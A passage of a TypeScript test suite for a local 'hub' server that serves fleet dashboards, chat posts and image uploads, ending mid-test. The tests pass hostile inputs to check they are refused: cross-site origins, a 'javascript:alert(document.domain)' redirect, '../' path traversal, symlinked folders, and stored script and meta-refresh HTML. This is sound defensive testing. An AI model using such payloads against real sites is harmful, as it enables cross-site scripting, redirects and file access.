/**
 * The hub (ported from the coordinator's tests/test_chat.py server classes and test_chat_serve.py,
 * against the hub's routes): each fleet of the registry at /f/<fleet>/ with serve_dashboard.py's routes
 * and status codes, the live stream, the index, who may write, and a peer hub's fleets passed through.
 * Every test starts a real hub on a free loopback port, with a registry of its own and a fake
 * `tailscale` that names this machine's owner.
 */
import { createHash } from "node:crypto";
import * as fs from "node:fs";
import { appendFileSync, chmodSync, existsSync, lstatSync, mkdirSync, readdirSync, readFileSync, rmSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:net";
import { dirname, join } from "node:path";

import { afterEach, beforeEach, describe, expect, mock, test } from "bun:test";

import { storeImage } from "../src/chat/attachments.ts";
import { append, renderLines } from "../src/chat/chat.ts";
import { readChat } from "../src/chat/store.ts";
import { ChatError } from "../src/errors.ts";
import { resolvePath } from "../src/files.ts";
import { type Answered, expireGrants, grantAnswer, registeredSession } from "../src/hub/grants.ts";
import { collapse } from "../src/hub/hub.ts";
import { chatOriginsPath, grantor, hello, parseChatOrigins, postRefusal, viewerOf, writerRefusal } from "../src/hub/policy.ts";
import { lsofListenersOf } from "../src/hub/served.ts";
import { startHub, type Running } from "../src/hub/server.ts";
import { frontmatter } from "../src/hub/skills.ts";
import { isTailnetIp, tailnetOf } from "../src/hub/tailnet.ts";
import { asArray, asObject, asString, type Json, type JsonObject } from "../src/json.ts";
import { parseInstant, stampOf } from "../src/clock.ts";
import type { Probe } from "../src/host.ts";
import { elapsedOf, holdsSocket, isClaudeBinary, lsofFiles, parentsOf, startedOf } from "../src/procs.ts";
import { recordTakeover, type Party } from "../src/takeover.ts";
import { lineOf, socketOf, wakeText, type Send } from "../src/wake.ts";
import { machineOf, type Machine } from "../src/world.ts";
import { baseEnv, fleet, machine, spawnFleet, tmp, type Environment } from "./support.ts";

const OWNER = "luiz@example.com";

const FAKE_TAILSCALE = `#!/bin/sh
case "$1 $2" in
  "status --json") printf '%s' '{"BackendState": "Running", "Self": {"DNSName": "box.tail.ts.net.", "TailscaleIPs": ["127.0.0.9"], "UserID": 7}, "User": {"7": {"LoginName": "${OWNER}"}}, "Peer": {}}' ;;
  *) exit 1 ;;
esac
`;

let base: string;

let home: string;

let root: string;

let env: Environment;

let running: Running | undefined;

let port: number;

/** What the running hub logged, one line each. */
let logged: string[] = [];

const stubs: ReturnType<typeof Bun.serve>[] = [];

function freePort(): number {
  const probe = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: () => new Response("") });
  const got = probe.port ?? 0;
  void probe.stop(true);

  return got;
}

function writeState(dir: string, agents: readonly JsonObject[], more: JsonObject = {}): void {
  const rows = agents.map((a) => ({ id: a["id"] ?? "", name: a["name"] ?? a["id"] ?? "", task: "t", status: a["status"] ?? "running", lane: [], milestone: "m1" }));

  const state = {
    project: "p",
    goal: "g",
    status: "running",
    now: "n",
    started: "2026-01-01T00:00:00+00:00",
    roadmap: [{ id: "m1", title: "M", steps: [] }],
    agents: rows,
    roadblocks: [],
    events: [],
    ...more,
  };

  writeFileSync(join(dir, "state.json"), JSON.stringify(state));
}

/** How a test's hub differs from the default: its `tailscale`, whether it asks its peers, its own clock
 * (`machine`), and what the machine says of a session's process before a wake is written (`session`). */
interface HubSetup {
  readonly tailscale?: string;
  readonly peers?: boolean;
  readonly machine?: Machine;
  readonly session?: Probe;
  readonly send?: Send;
}

/** What of a setup the hub is given only when the test gives it. */
interface Asked {
  session?: Probe;
  send?: Send;
}

async function start(options: HubSetup = {}): Promise<void> {
  port = freePort();
  const m = options.machine ?? machine(env);
  const asked: Asked = {};

  if (options.session !== undefined) asked.session = options.session;

  if (options.send !== undefined) asked.send = options.send;
  logged = [];
  const got = await startHub({ port, machine: m, tailscale: options.tailscale ?? join(base, "no-tailscale"), peers: options.peers ?? false, hosts: [], https: undefined, ...asked }, (line) => logged.push(line));

  if (got instanceof Error) throw got;
  running = got;
}

function register(dir: string, id?: string): void {
  const m = machine(env);
  const entry = m.registry.register(dir, "u", process.pid, "2026-01-01T00:00:00+00:00");

  if (id !== undefined && entry.id !== id) throw new Error(`registered as ${entry.id}`);
}

interface Answer {
  readonly status: number;
  readonly body: JsonObject;
  readonly headers: Headers;
}

async function request(method: string, path: string, body?: string, headers: Record<string, string> = {}): Promise<Answer> {
  const init: RequestInit = { method, headers, redirect: "manual" };

  if (body !== undefined) init.body = body;
  const res = await fetch(`http://127.0.0.1:${port}${path}`, init);
  const text = await res.text();
  let parsed: JsonObject = {};

  try {
    parsed = asObject(JSON.parse(text)) ?? {};
  } catch {
    parsed = { text };
  }

  return { status: res.status, body: parsed, headers: res.headers };
}

/** What the fleet's own page sends with a post that grants: its origin, same-origin, and the page token the hub put
 * in that page at its top-level load (`grantRefusal`). */
async function pageHeaders(path: string): Promise<Record<string, string>> {
  const page = await request("GET", path.replace(/chat(?:\/preview)?$/u, ""), undefined, { "Sec-Fetch-Dest": "document" });
  const token = /<meta name="fleet-page-token" content="([^"]+)">/u.exec(asString(page.body["text"]) ?? "")?.[1] ?? "";

  return { Origin: `http://127.0.0.1:${String(port)}`, "Sec-Fetch-Site": "same-origin", "X-Fleet-Page-Token": token };
}

/** A post as the page sends it; an answer that grants (allow-once, allow-kind) or adds a rule (add-rule) carries the
 * page's headers, as the fleet's own page does. */
async function post(payload: string | JsonObject, headers: Record<string, string> = {}, path = "/f/p/chat"): Promise<Answer> {
  const body = payload instanceof Object ? payload : {};
  const grants = asString(body["decision"]) !== undefined && /^(?:allow-|add-rule)/iu.test((asString(body["text"]) ?? "").trim());
  const page = grants ? await pageHeaders(path) : {};

  return request("POST", path, payload instanceof Object ? JSON.stringify(payload) : payload, { "Content-Type": "application/json", ...page, ...headers });
}

/** An open stream, read one event at a time. */
class Stream {
  private readonly reader: { read: () => Promise<{ readonly done: boolean; readonly value?: Uint8Array | undefined }> };
  private buffer = "";
  private readonly decoder = new TextDecoder();
  readonly response: Response;
  private readonly abort: AbortController;

  private constructor(response: Response, abort: AbortController) {
    this.response = response;
    this.abort = abort;
    const body = response.body;

    if (body === null) throw new Error("no body");
    this.reader = body.getReader();
  }

  static async open(path: string, headers: Record<string, string> = {}): Promise<Stream> {
    const abort = new AbortController();
    const res = await fetch(`http://127.0.0.1:${port}${path}`, { headers, signal: abort.signal });

    return new Stream(res, abort);
  }

  async next(ms = 5000): Promise<Record<string, string>> {
    const deadline = Date.now() + ms;

    for (;;) {
      const end = this.buffer.indexOf("\n\n");

      if (end >= 0) {
        const block = this.buffer.slice(0, end);
        this.buffer = this.buffer.slice(end + 2);

        if (block.startsWith(":")) continue;
        const event: Record<string, string> = {};

        for (const line of block.split("\n")) {
          const at = line.indexOf(": ");
          event[line.slice(0, at)] = line.slice(at + 2);
        }

        return event;
      }

      const left = deadline - Date.now();

      if (left <= 0) throw new Error(`no event within ${ms} ms (have ${JSON.stringify(this.buffer)})`);
      const got = await Promise.race([this.reader.read(), new Promise<"timeout">((resolve) => setTimeout(() => resolve("timeout"), left))]);

      if (got === "timeout") continue;

      if (got.done || got.value === undefined) throw new Error("the stream ended");
      this.buffer += this.decoder.decode(got.value, { stream: true });
    }
  }

  async nextOf(kind: string): Promise<Record<string, string>> {
    for (;;) {
      const event = await this.next();

      if (event["event"] === kind) return event;
    }
  }

  close(): void {
    this.abort.abort();
  }
}

function data(event: Record<string, string>): JsonObject {
  return asObject(JSON.parse(event["data"] ?? "null")) ?? {};
}

function say(sender: string, text: string, more: { readonly re?: number; readonly decision?: string } = {}): number {
  const m = append(machine(env), root, { sender, text, allowUser: true, ...more }, "2026-01-01T00:00:00+00:00");

  if (m instanceof ChatError) throw new Error(m.reason);

  return m.id;
}

beforeEach(() => {
  base = tmp("fleet-hub-");
  home = join(base, "registry");
  root = join(base, "p", "coordinator");
  mkdirSync(root, { recursive: true });
  env = baseEnv(home);
  writeState(root, [{ id: "a1", name: "notes-impl" }, { id: "a2", status: "done" }]);
  register(root, "p");
});

afterEach(async () => {
  await running?.stop();
  running = undefined;

  for (const stub of stubs.splice(0)) void stub.stop(true);
});

describe("a fleet's chat through the hub", () => {
  beforeEach(() => start());

  test("POST stores the user's message and GET lists the messages after an id", async () => {
    const sent = await post({ text: "@a1 status?" });
    expect(sent.status).toBe(201);
    expect([sent.body["id"], sent.body["from"], sent.body["to"]]).toEqual([1, "user", ["a1"]]);
    say("a1", "halfway", { re: 1 });
    const after = await request("GET", "/f/p/chat?after=1");
    expect(after.status).toBe(200);
    expect((asArray(after.body["messages"]) ?? []).map((m) => [asObject(m)?.["id"], asObject(m)?.["text"], asObject(m)?.["re"]])).toEqual([[2, "halfway", 1]]);
    expect(asArray((await request("GET", "/f/p/chat")).body["messages"])?.length).toBe(2);
  });

  test("a command typed on the page is stored as it was typed, and reaches GET /chat and the stream", async () => {
    const stream = await Stream.open("/f/p/events");
    const sent = await post({ text: "/tstack:tdd fix the parser" });
    expect([sent.status, sent.body["from"], sent.body["to"], sent.body["text"]]).toEqual([201, "user", ["coordinator"], "/tstack:tdd fix the parser"]);
    expect(asArray((await request("GET", "/f/p/chat")).body["messages"])).toEqual([sent.body]);
    expect(data(await stream.nextOf("chat"))).toEqual(sent.body);
    stream.close();
  });

  test("a refused post stores nothing and says why", async () => {
    say("user", "one");

    const cases: (readonly [number, Answer])[] = [
      [415, await request("POST", "/f/p/chat", '{"text": "hi"}', { "Content-Type": "text/plain" })],
      [403, await post({ text: "hi" }, { Origin: "https://evil.example" })],
      [413, await post({ text: "x".repeat(300_000) })],
      [400, await post({ text: "  " })],
      [400, await post({ text: "hi", re: 9 })],
      [400, await post("not json")],
      [400, await post({ text: "hi", re: true })],
      [404, await post({ text: "hi" }, {}, "/f/p/elsewhere")],
    ];

    for (const [status, answer] of cases) {
      expect(answer.status).toBe(status);
      expect(asString(answer.body["error"])).toBeString();
    }

    expect(readChat(root).length).toBe(1);
  });

  test("a message of 78 KB is taken; one over 256 KiB is a 413 that says how big it is and what to do", async () => {
    const long = await post({ text: "y".repeat(78_000) });
    expect([long.status, asString(long.body["text"])?.length]).toEqual([201, 78_000]);
    const over = await post({ text: "x".repeat(300_000) });
    expect([over.status, over.body]).toEqual([
      413,
      { error: "This message is 293 KiB; the most a message can be is 256 KiB. Shorten it, or put the long part in a file and give its path." },
    ]);
    expect(readChat(root).length).toBe(1);
  });

  test("posts that open a side chat with the same key on a decision join one side chat, also after a restart; another key opens another", async () => {
    const quote = { text: "Stripe rounds on the total", from: "D1 Rounding", at: { hash: "#decision/d1", anchor: "dv-body" } };
    const first = await post({ text: "first", side: "new", quote, opens: "n1" });
    const again = await post({ text: "second", side: "new", quote, opens: "n1" });
    expect([first.status, first.body["side"], first.body["opens"], first.body["quote"]]).toEqual([201, 1, "n1", quote]);
    expect([again.status, again.body["side"], again.body["opens"], again.body["quote"]]).toEqual([201, 1, undefined, undefined]);
    await running?.stop();
    await start();
    const later = await post({ text: "days later", side: "new", quote, opens: "n1" });
    const other = await post({ text: "another thought", side: "new", quote, opens: "n2" });
    const elsewhere = await post({ text: "same key, d2", side: "new", quote: { ...quote, at: { hash: "#decision/d2", anchor: "dv-body" } }, opens: "n1" });
    const keyless = await post({ text: "no key", side: "new", quote });
    expect([later.body["side"], other.body["side"], elsewhere.body["side"], keyless.body["side"]]).toEqual([1, 4, 5, 6]);
    expect(readChat(root).map((m) => m.side)).toEqual([1, 1, 1, 4, 5, 6]);
  });

  test("a side chat's open key is short, of letters, digits, - and _, and goes only with side new", async () => {
    const quote = { text: "q", at: { hash: "#decision/d1" } };
    const badKey = "opens is the page's key for the side chat it opens: 1 to 64 of A-Z, a-z, 0-9, - and _";

    for (const [payload, error] of [
      [{ text: "a", side: "new", quote, opens: "a b" }, badKey],
      [{ text: "a", side: "new", quote, opens: "x".repeat(65) }, badKey],
      [{ text: "a", side: "new", quote, opens: 7 }, badKey],
      [{ text: "a", opens: "n1" }, "opens goes with side new: it names the side chat the post opens"],
    ] as const) {
      const got = await post(payload);
      expect([got.status, got.body["error"]]).toEqual([400, error]);
    }

    expect(readChat(root)).toEqual([]);
  });

  test("hello tells the page the most bytes a post may have", async () => {
    const stream = await Stream.open("/f/p/events");
    expect(data(await stream.next())).toEqual({ write: true, max_bytes: 256 * 1024 });
    stream.close();
  });

  test("the page's exit post (fetch keepalive, same origin) is taken under the usual checks, and a cross-site one refused", async () => {
    const marks = { decision: { id: "d30", title: "Cache policy", revision: "r1" }, at: { hash: "#decision/d30" }, items: [{ n: 1, kind: "general", comment: "fine" }] };
    const body = JSON.stringify({ text: "1 mark on d30", marks });

    const exit = async (headers: Record<string, string>): Promise<number> => {
      const res = await fetch(`http://127.0.0.1:${port}/f/p/chat`, { method: "POST", keepalive: true, body, headers: { "Content-Type": "application/json", "Sec-Fetch-Mode": "cors", ...headers } });
      await res.text();

      return res.status;
    };

    expect(await exit({ Origin: `http://127.0.0.1:${port}`, "Sec-Fetch-Site": "same-origin" })).toBe(201);
    expect(await exit({ Origin: "https://evil.example", "Sec-Fetch-Site": "cross-site" })).toBe(403);
    expect(await exit({ "Sec-Fetch-Site": "cross-site" })).toBe(403);
    expect(readChat(root).map((m) => [m.text, m.to])).toEqual([["1 mark on d30", ["coordinator"]]]);
  });

  test("a same-origin post is taken", async () => {
    const sent = await post({ text: "hi" }, { Origin: `http://127.0.0.1:${port}`, "Content-Type": "application/json; charset=utf-8" });
    expect(sent.status).toBe(201);
  });

  test("a quote's place is kept, and a malformed one refused", async () => {
    const quote = { text: "per line", from: "Rounding", at: { hash: "#decision/d1", anchor: "dv-info" } };
    const sent = await post({ text: "why?", quote });
    expect([sent.status, sent.body["quote"]]).toEqual([201, quote]);
    const bad = await post({ text: "why?", quote: { ...quote, at: { hash: "decision/d1" } } });
    expect([bad.status, asString(bad.body["error"])?.includes("place")]).toEqual([400, true]);
    expect(readChat(root).map((m) => m.quote)).toEqual([quote]);
  });

  test("a store that cannot be written is a 500, not blamed on the body", async () => {
    mkdirSync(join(root, "chat.jsonl"));
    const sent = await post({ text: "hi" });
    expect(sent.status).toBe(500);
    expect(asString(sent.body["error"])).not.toContain("body");
  });

  test("an unknown fleet is a 404 and a fleet's address without its slash moves to it", async () => {
    expect((await request("GET", "/f/nobody/")).status).toBe(404);
    const moved = await request("GET", "/f/p?x=1");
    expect([moved.status, moved.headers.get("Location")]).toEqual([301, "/f/p/?x=1"]);
  });

  test("a moved team's address sends a reader to its cloud page, and a write there is still refused", async () => {
    const moved = join(base, "fleet", "skills");
    mkdirSync(moved, { recursive: true });
    writeFileSync(join(moved, "state.json"), JSON.stringify({ project: "skills", decisions: [] }));
    writeFileSync(join(moved, "cloud.json"), JSON.stringify({ fleet: "skills", cloud: "https://fleet.example.dev/" }));
    const read = await request("GET", "/f/skills/?x=1");
    expect([read.status, read.headers.get("Location")]).toEqual([302, "https://fleet.example.dev/skills"]);
    expect((await post({ text: "hi" }, {}, "/f/skills/chat")).status).toBe(404);
  });

  test("a moved team whose cloud is not an https address is not redirected to", async () => {
    const moved = join(base, "fleet", "skills");
    mkdirSync(moved, { recursive: true });
    writeFileSync(join(moved, "state.json"), JSON.stringify({ project: "skills", decisions: [] }));

    for (const cloud of ["javascript:alert(document.domain)//", "http://fleet.example.dev"]) {
      writeFileSync(join(moved, "cloud.json"), JSON.stringify({ fleet: "skills", cloud }));
      const read = await request("GET", "/f/skills/");
      expect([cloud, read.status, read.headers.get("Location")]).toEqual([cloud, 404, null]);
    }
  });

  test("a fleet renamed with `fleets name` is still found at its old address", async () => {
    expect(fleet(["fleets", "name", root, "infra-coordinator-2"], env).code).toBe(0);
    const old = await request("GET", "/f/p/?x=1");
    expect([old.status, old.headers.get("Location")]).toEqual([301, "/f/infra-coordinator-2/?x=1"]);
    expect((await request("GET", "/f/infra-coordinator-2/")).status).toBe(200);
  });
});

describe("an image pasted into the chat", () => {
  beforeEach(() => start());

  /** A PNG's first bytes, then `tail` so each test's image is its own. */
  const png = (tail: string): Buffer => Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.from(tail)]);

  async function upload(bytes: Buffer, type: string, headers: Record<string, string> = {}): Promise<Answer> {
    const res = await fetch(`http://127.0.0.1:${port}/f/p/attachments`, { method: "POST", headers: { "Content-Type": type, ...headers }, body: bytes });
    const text = await res.text();

    return { status: res.status, body: asObject(JSON.parse(text)) ?? {}, headers: res.headers };
  }

  test("the page's paste is stored once per content under attachments/, and served back as the image", async () => {
    const own = await pageHeaders("/f/p/chat");
    const first = await upload(png("one"), "image/png", own);
    const path = asString(first.body["path"]) ?? "";
    expect([first.status, path]).toEqual([201, `attachments/${createHash("sha256").update(png("one")).digest("hex").slice(0, 16)}.png`]);
    expect(readFileSync(join(root, path)).equals(png("one"))).toBe(true);
    const again = await upload(png("one"), "image/png", own);
    expect([again.status, again.body["path"]]).toEqual([201, path]);
    expect(readdirSync(join(root, "attachments"))).toEqual([path.slice("attachments/".length)]);
    const served = await fetch(`http://127.0.0.1:${port}/f/p/${path}`);
    expect([served.status, served.headers.get("Content-Type")]).toEqual([200, "image/png"]);
    expect(Buffer.from(await served.arrayBuffer()).equals(png("one"))).toBe(true);
  });

  test("only png, jpeg, webp and gif of at most 10 MB are taken, each its bytes what its type says", async () => {
    const own = await pageHeaders("/f/p/chat");
    const kinds = "Only a PNG, JPEG, WebP or GIF image can be attached.";

    const cases: readonly (readonly [Buffer, string, number, string])[] = [
      [Buffer.from("hello"), "text/plain", 415, kinds],
      [Buffer.from("<svg xmlns='http://www.w3.org/2000/svg'/>"), "image/svg+xml", 415, kinds],
      [Buffer.from("not a png at all"), "image/png", 415, "This file is not the image/png it says it is."],
      [Buffer.alloc(0), "image/png", 400, "The image is empty."],
      [Buffer.concat([png("big"), Buffer.alloc(10 * 1024 * 1024)]), "image/png", 413, "This image is 10241 KiB; the most an image can be is 10 MB."],
    ];

    for (const [bytes, type, status, error] of cases) {
      const got = await upload(bytes, type, own);
      expect([got.status, got.body["error"]], type).toEqual([status, error]);
    }

    expect(existsSync(join(root, "attachments"))).toBe(false);
    const jpeg = await upload(Buffer.from([0xff, 0xd8, 0xff, 0xe0, 1, 2]), "image/jpeg", own);
    const gif = await upload(Buffer.from("GIF89a...."), "image/gif", own);
    const webp = await upload(Buffer.concat([Buffer.from("RIFF"), Buffer.from([4, 0, 0, 0]), Buffer.from("WEBPVP8 ")]), "image/webp", own);
    expect([jpeg, gif, webp].map((a) => [a.status, (asString(a.body["path"]) ?? "").replace(/[0-9a-f]{16}/u, "H")])).toEqual([
      [201, "attachments/H.jpg"],
      [201, "attachments/H.gif"],
      [201, "attachments/H.webp"],
    ]);
  });

  test("an upload is the fleet's own page's, as a grant is: one with no Origin, Sec-Fetch-Site or page token stores nothing", async () => {
    const self = `http://127.0.0.1:${String(port)}`;
    const own = await pageHeaders("/f/p/chat");
    const refused = "a grant comes only from the fleet's own page on this hub: answer it there";
    const stale = "the page token is missing or stale: reload the fleet's page and answer again";

    // As a grant's: only a token sent and not accepted offers the page a Reload.
    const cases: readonly (readonly [Record<string, string>, string, boolean | undefined])[] = [
      [{}, refused, undefined],
      [{ Origin: self }, refused, undefined],
      [{ Origin: "http://evil.example", "Sec-Fetch-Site": "cross-site", "X-Fleet-Page-Token": own["X-Fleet-Page-Token"] ?? "" }, refused, undefined],
      [{ Origin: self, "Sec-Fetch-Site": "same-origin" }, stale, undefined],
      [{ ...own, "X-Fleet-Page-Token": "" }, stale, undefined],
      [{ ...own, "X-Fleet-Page-Token": "x" }, stale, true],
      [{ ...own, "X-Fleet-Page-Token": "x".repeat(32) }, stale, true],
    ];

    for (const [headers, error, reload] of cases) {
      const got = await upload(png("gate"), "image/png", headers);
      expect([got.status, got.body["error"], got.body["reload"]], JSON.stringify(headers)).toEqual([403, error, reload]);
    }

    expect(existsSync(join(root, "attachments"))).toBe(false);
  });

  test("a message carries its images: stored with it, refused when one was never uploaded, and its watch line gives each one's path", async () => {
    const own = await pageHeaders("/f/p/chat");
    const path = asString((await upload(png("msg"), "image/png", own)).body["path"]) ?? "";
    const sent = await post({ text: "@a1 this screen", images: [path] });
    expect([sent.status, sent.body["images"]]).toEqual([201, [path]]);
    const alone = await post({ text: "", images: [path] });
    expect([alone.status, alone.body["text"], alone.body["images"]]).toEqual([201, "", [path]]);

    for (const images of [["attachments/0123456789abcdef.png"], ["../state.json"], ["attachments/x.svg"], "attachments/a.png"]) {
      const got = await post({ text: "look", images });
      expect([got.status, got.body["error"]], JSON.stringify(images)).toEqual([400, "images are the attachments/<hash>.<png|jpg|webp|gif> files this fleet's page uploaded, at most 8"]);
    }

    expect((await post({ text: "", images: [] })).status).toBe(400);
    const lines = renderLines(machine(env), root, readChat(root));
    const abs = join(resolvePath(root), path);
    expect(lines[0]?.endsWith(`: @a1 this screen [image: ${abs}]`)).toBe(true);
    expect(lines[1]?.endsWith(`: [image: ${abs}]`)).toBe(true);
  });

  const marked = (images: Json): JsonObject => ({
    decision: { id: "d1", title: "Invoice schema", revision: "2026-01-01T00:00:00+00:00" },
    at: { hash: "#decision/d1" },
    items: [
      { n: 1, kind: "general", comment: "this screen", images },
      { n: 2, kind: "general", comment: "no picture" },
    ],
  });

  test("a mark carries its images: stored with its batch, refused when one was never uploaded or is not such a path, and the watch line gives each one's path with its mark", async () => {
    const own = await pageHeaders("/f/p/chat");
    const path = asString((await upload(png("mark"), "image/png", own)).body["path"]) ?? "";
    const sent = await post({ text: "2 marks on d1", marks: marked([path]) });
    expect([sent.status, sent.body["marks"]]).toEqual([201, marked([path])]);
    expect(readChat(root)[0]?.stored["marks"]).toEqual(marked([path]));
    const missing = await post({ text: "2 marks on d1", marks: marked(["attachments/0123456789abcdef.png"]) });
    expect([missing.status, missing.body["error"]]).toEqual([400, "images are the attachments/<hash>.<png|jpg|webp|gif> files this fleet's page uploaded, at most 8"]);
    const nine = Array.from({ length: 9 }, (_, i) => `attachments/${String(i).repeat(16)}.png`);

    for (const images of [["../state.json"], ["attachments/x.svg"], "attachments/a.png", nine, [3]]) {
      const got = await post({ text: "2 marks on d1", marks: marked(images) });
      expect([got.status, got.body["error"]], JSON.stringify(images)).toEqual([400, "marks are {decision, at, items}: mark 1.images is a list of at most 8 attachments/<hash>.<png|jpg|webp|gif> paths"]);
    }

    expect(readChat(root).length).toBe(1);
    const abs = join(resolvePath(root), path);
    expect(renderLines(machine(env), root, readChat(root))[0]?.endsWith(`: 2 marks on d1 [image on mark 1: ${abs}]`)).toBe(true);
  });

  test("only the machine's owner uploads: a viewer Tailscale names as someone else is refused, with the page's own headers", async () => {
    await running?.stop();
    const fake = join(base, "tailscale");
    writeFileSync(fake, FAKE_TAILSCALE);
    chmodSync(fake, 0o755);
    await start({ tailscale: fake });
    const own = await pageHeaders("/f/p/chat");
    const eve = await upload(png("eve"), "image/png", { ...own, "Tailscale-User-Login": "eve@example.com" });
    expect([eve.status, eve.body["error"]]).toEqual([403, `only ${OWNER} can write here`]);
    expect(existsSync(join(root, "attachments"))).toBe(false);
  });

  test("an upload names its length: one sent in chunks with no Content-Length is refused (411), small or over 10 MB, and stores nothing", async () => {
    const own = await pageHeaders("/f/p/chat");

    for (const bytes of [png("chunked"), Buffer.concat([png("big"), Buffer.alloc(10 * 1024 * 1024)])]) {
      const body = new ReadableStream<Uint8Array>({
        start(c) {
          for (let i = 0; i < bytes.length; i += 1 << 20) c.enqueue(bytes.subarray(i, i + (1 << 20)));

          c.close();
        },
      });

      const res = await fetch(`http://127.0.0.1:${port}/f/p/attachments`, { method: "POST", headers: { "Content-Type": "image/png", ...own }, body });
      const got = asObject(JSON.parse(await res.text())) ?? {};
      expect([res.status, got["error"]], String(bytes.length)).toEqual([411, "An image is sent with its Content-Length."]);
    }

    expect(existsSync(join(root, "attachments"))).toBe(false);
  });

  test("an image path is the whole of attachments/<hash>.<ext>: one under another folder is refused, on a message and on a mark", async () => {
    const planted = "../x/attachments/0123456789abcdef.png";
    mkdirSync(join(root, "../x/attachments"), { recursive: true });
    writeFileSync(join(root, planted), png("planted"));
    const message = await post({ text: "look", images: [planted] });
    expect([message.status, message.body["error"]]).toEqual([400, "images are the attachments/<hash>.<png|jpg|webp|gif> files this fleet's page uploaded, at most 8"]);
    const mark = await post({ text: "2 marks on d1", marks: marked([planted]) });
    expect([mark.status, mark.body["error"]]).toEqual([400, "marks are {decision, at, items}: mark 1.images is a list of at most 8 attachments/<hash>.<png|jpg|webp|gif> paths"]);
    expect(readChat(root)).toEqual([]);
  });

  test("an attachments folder that is a symlink is never written through, nor read as the fleet's", async () => {
    const own = await pageHeaders("/f/p/chat");
    const outside = join(base, "outside");
    mkdirSync(outside);
    writeFileSync(join(outside, "0123456789abcdef.png"), png("planted"));
    symlinkSync(outside, join(root, "attachments"));
    const got = await upload(png("through"), "image/png", own);
    expect([got.status, got.body["error"]]).toEqual([500, "The fleet's attachments folder is a symlink: the hub keeps images only in a folder of its own."]);
    expect(readdirSync(outside)).toEqual(["0123456789abcdef.png"]);
    expect((await post({ text: "look", images: ["attachments/0123456789abcdef.png"] })).status).toBe(400);
  });

  test("an image's place that is already a symlink is refused, and nothing is written where it leads", async () => {
    const own = await pageHeaders("/f/p/chat");
    const bytes = png("linked");
    const name = `${createHash("sha256").update(bytes).digest("hex").slice(0, 16)}.png`;
    mkdirSync(join(root, "attachments"));
    symlinkSync(join(base, "elsewhere.png"), join(root, "attachments", name));
    const got = await upload(bytes, "image/png", own);
    expect([got.status, got.body["error"]]).toEqual([500, `attachments/${name} is there and is not an image the hub stored: it is left as it is.`]);
    expect(existsSync(join(base, "elsewhere.png"))).toBe(false);
  });

  test("a write cut short is never kept: the image is written beside its place and linked in whole", () => {
    const bytes = png("cut");

    const cut = (path: string, data: Buffer): void => {
      writeFileSync(path, data.subarray(0, 4));
      throw new Error("disk full");
    };

    expect(storeImage(root, "image/png", bytes, cut)).toEqual({ refused: [500, "Could not store the image: disk full"] });
    expect(readdirSync(join(root, "attachments"))).toEqual([]);
    const stored = storeImage(root, "image/png", bytes);
    const path = "path" in stored ? stored.path : "";
    expect(readFileSync(join(root, path)).equals(bytes)).toBe(true);
    expect(readdirSync(join(root, "attachments"))).toEqual([path.slice("attachments/".length)]);
  });

  test("a mark's images may stand in for its words: a general mark with an image and no comment is taken, one with neither is not", async () => {
    const own = await pageHeaders("/f/p/chat");
    const path = asString((await upload(png("alone"), "image/png", own)).body["path"]) ?? "";
    const batch = (images?: readonly string[]): JsonObject => ({ ...marked([]), items: [images === undefined ? { n: 1, kind: "general" } : { n: 1, kind: "general", images: [...images] }] });
    const taken = await post({ text: "1 mark on d1", marks: batch([path]) });
    expect([taken.status, asArray(asObject(taken.body["marks"])?.["items"])]).toEqual([201, [{ n: 1, kind: "general", images: [path] }]]);
    const bare = await post({ text: "1 mark on d1", marks: batch() });
    expect([bare.status, bare.body["error"]]).toEqual([400, "marks are {decision, at, items}: mark 1 is a general mark: it needs its comment"]);
  });
});

describe("the page and the files", () => {
  beforeEach(() => start());

  test("the page is rendered from state.json on each load", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/f/p/`);
    const html = await res.text();
    expect(res.status).toBe(200);
    expect(res.headers.get("Cache-Control")).toBe("no-store");
    expect(html).toStartWith("<!doctype html>");
    expect(html).toContain('<script id="fleet-state" type="application/json">{"project": "p"');
    fleet(["state", root, "set", "--now", "now from the ledger", "-q"], env);
    expect(await (await fetch(`http://127.0.0.1:${port}/f/p/index.html`)).text()).toContain("now from the ledger");
  });

  test("a decision's body is served without the page's origin, wherever its path leads", async () => {
    mkdirSync(join(root, "decisions"));
    writeFileSync(join(root, "decisions", "d1.html"), "<script>fetch('/chat')</script>");

    for (const path of ["/f/p/decisions/d1.html", "/f/p/decisions/d1.html?v=2", "/f/p/decisions/../decisions/d1.html"]) {
      const res = await fetch(`http://127.0.0.1:${port}${path}`);
      expect(res.status).toBe(200);
      expect(res.headers.get("Content-Security-Policy") ?? "").toStartWith("sandbox allow-scripts");
      expect(res.headers.get("Content-Security-Policy") ?? "").toContain("; default-src 'none'; script-src 'none'; ");
    }

    expect((await fetch(`http://127.0.0.1:${port}/f/p/`)).headers.get("Content-Security-Policy")).toBeNull();
    expect((await fetch(`http://127.0.0.1:${port}/f/p/state.json`)).headers.get("Content-Security-Policy")).toBeNull();
  });

  test("a decision's body served by itself is plain text, never sniffed: nothing in it renders, runs or takes the tab; a picture stays a picture", async () => {
    mkdirSync(join(root, "decisions"), { recursive: true });
    const body = '<meta http-equiv="&#114;efresh" content="0;url=/elsewhere"><p>Kept</p><a href="/x" target="_top">top</a><svg><a href="/y"><text>t</text></a></svg>';
    writeFileSync(join(root, "decisions", "d2.html"), body);
    writeFileSync(join(root, "decisions", "d2.svg"), '<svg xmlns="http://www.w3.org/2000/svg"><a href="/x" target="_top"><text>t</text></a></svg>');
    writeFileSync(join(root, "decisions", "d2.png"), Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==", "base64"));

    for (const method of ["GET", "HEAD"]) {
      const res = await fetch(`http://127.0.0.1:${port}/f/p/decisions/d2.html`, { method });
      expect(res.headers.get("Content-Type")).toBe("text/plain; charset=utf-8");
      expect(res.headers.get("X-Content-Type-Options")).toBe("nosniff");
      expect(res.headers.get("Content-Security-Policy") ?? "").toStartWith("sandbox allow-scripts");
      expect(res.headers.get("Content-Security-Policy") ?? "").toContain("; script-src 'none'; ");
      expect(await res.text()).toBe(method === "GET" ? body : "");
    }

    const png = await fetch(`http://127.0.0.1:${port}/f/p/decisions/d2.png`);
    expect(png.headers.get("Content-Type")).toBe("image/png");
